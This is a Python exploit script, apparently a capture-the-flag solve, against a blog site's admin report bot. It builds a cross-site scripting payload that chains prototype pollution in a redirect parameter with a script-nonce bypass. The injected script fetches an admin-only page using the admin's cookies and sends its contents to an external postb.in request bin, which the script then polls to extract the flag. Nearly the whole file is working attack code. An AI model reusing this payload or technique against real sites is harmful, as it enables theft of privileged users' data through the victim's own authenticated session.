#!/usr/bin/env python3
import os
import time
import base64
import binascii
import requests

BASEURL = 'https://grande-blog.site'
BASEURL = BASEURL.strip('/')

rbin = requests.post('https://postb.in/api/bin')
rbin = rbin.json()['binId']
rbin_url = 'https://postb.in/'+rbin

ses = requests.session()

payload = '''<script>
async function run() {
  await fetch('https://grande-blog.site/logout',{credentials:'include'}).catch(()=>{})

  let payload = `
console.log('xsss');
fetch('/admin/my_favorite_flag',{credentials:'include'}).then(x=>x.text()).then(x=>{
  fetch('{{RBIN}}?e='+encodeURIComponent(x));
});
  `;

  const BASE_URL = 'https://grande-blog.site';
  let url = BASE_URL + `/next?next[__proto__][]&next[length]=2&next[]=${BASE_URL}&next[]=${encodeURIComponent(`"><s`+`cript nonce="undefined">${payload}</s`+`cript>`)}`;
  location.href = url;
}
run();
</script>
'''

payload = payload.replace('{{RBIN}}',rbin_url)
payload = 'data:text/html,'+payload

print('[+] Sending request to admin')
res = ses.post(BASEURL+'/report/',data=dict(
    solution_key='8062d52e8a81eb6d598c7164f8b944bee7b3013d51e174aa363dca',
    url=payload
))
uid = res.url
while 1:
    print('[+] Waiting on admin...')
    time.sleep(5)
    r = ses.get(uid)
    if 'link soon' not in r.text:
        break

print('[+] Grabbing flag...')
time.sleep(2)

res = requests.get('https://postb.in/api/bin/'+rbin+'/req/shift')

data = res.json()['query']['e']

try:
    flag = data.split('<h1>flag{')[1].split('}')[0]
    print('flag{'+flag+'}')
except:
    print('[!] Could not find flag in exfiled data')
finally:
    requests.delete('https://postb.in/api/bin/'+rbin)

